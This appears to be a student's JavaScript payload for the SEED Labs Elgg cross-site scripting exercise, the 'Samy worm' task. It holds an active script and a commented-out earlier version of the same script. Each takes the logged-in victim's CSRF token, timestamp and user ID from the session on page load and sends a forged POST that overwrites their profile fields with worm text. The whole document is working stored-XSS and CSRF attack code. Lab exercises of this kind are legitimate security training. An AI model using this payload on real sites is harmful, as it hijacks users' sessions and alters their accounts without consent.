<script type="text/javascript">
    window.onload = function() {
        var ts = elgg.security.token.__elgg_ts;
        var token = elgg.security.token.__elgg_token;
        var name = elgg.session.user.name;
        var guid = elgg.session.user.guid;

        var sendurl = "/action/profile/edit";

        // If the user is Samy, then the attack is not performed
        if (name == "Samy") return;

        var formData = new FormData();
        formData.append('__elgg_token', token);
        formData.append('__elgg_ts', ts);
        formData.append('name', name);
        formData.append('description', '1905001');
        formData.append('accesslevel[description]', '1');
        formData.append('briefdescription', 'I am Samy, the worm. Catch me if you can.');
        formData.append('accesslevel[briefdescription]', '1');
        formData.append('location', 'Pyongyang');
        formData.append('accesslevel[location]', '1');
        formData.append('interests', 'Hacking, XSS, Worms, CSRF, and so on.');
        formData.append('accesslevel[interests]', '1');
        formData.append('skills', 'I can write a worm in 5 minutes. Can you?');
        formData.append('accesslevel[skills]', '1');
        formData.append('contactemail', 'catchmeifyoucan@yahoo.com');
        formData.append('accesslevel[contactemail]', '1');
        formData.append('phone', '9557134');
        formData.append('accesslevel[phone]', '1');
        formData.append('mobile', '01234567890');
        formData.append('accesslevel[mobile]', '1');
        formData.append('website', 'www.samy-worm.com');
        formData.append('accesslevel[website]', '1');
        formData.append('twitter', 'elonmusk');
        formData.append('accesslevel[twitter]', '1');
        formData.append('guid', guid);

        var ajax = new XMLHttpRequest();
        ajax.open("POST", sendurl, true);
        ajax.setRequestHeader("Host", "www.seed-server.com");
        ajax.send(formData);
    }
</script>



/* <script type="text/javascript">
	window.onload = function() {
	    var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	    var token="&__elgg_token="+elgg.security.token.__elgg_token;
	    var name=elgg.session.user.name;
	    var guid=elgg.session.user.guid;
        var sendurl='/action/profile/edit';
	    var content=`__elgg_token=${token}&__elgg_ts=${ts}&name=${name}&description=1905001&accesslevel[description]=1&briefdescription=I am Samy, the worm. Catch me if you can.&accesslevel[briefdescription]=1&location=Moscow&accesslevel[location]=1&interests=Hacking&accesslevel[interests]=1&skills=Cyber Security&accesslevel[skills]=1&contactemail=abc@yahoo.com&accesslevel[contactemail]=1&phone=9786546&accesslevel[phone]=1&mobile=01234567898&accesslevel[mobile]=1&website=www.clickme.com&accesslevel[website]=1&twitter=elonmusk&accesslevel[twitter]=1&guid=${guid}`;
	
        if(name!="Samy")
        {
            var Ajax=null;
            Ajax=new XMLHttpRequest();
            Ajax.open("POST",sendurl,true);
            Ajax.setRequestHeader("Host","www.seed-server.com");
            Ajax.setRequestHeader("Content-Type",
            "application/x-www-form-urlencoded");
            Ajax.send(content);
        }
	}
</script> */

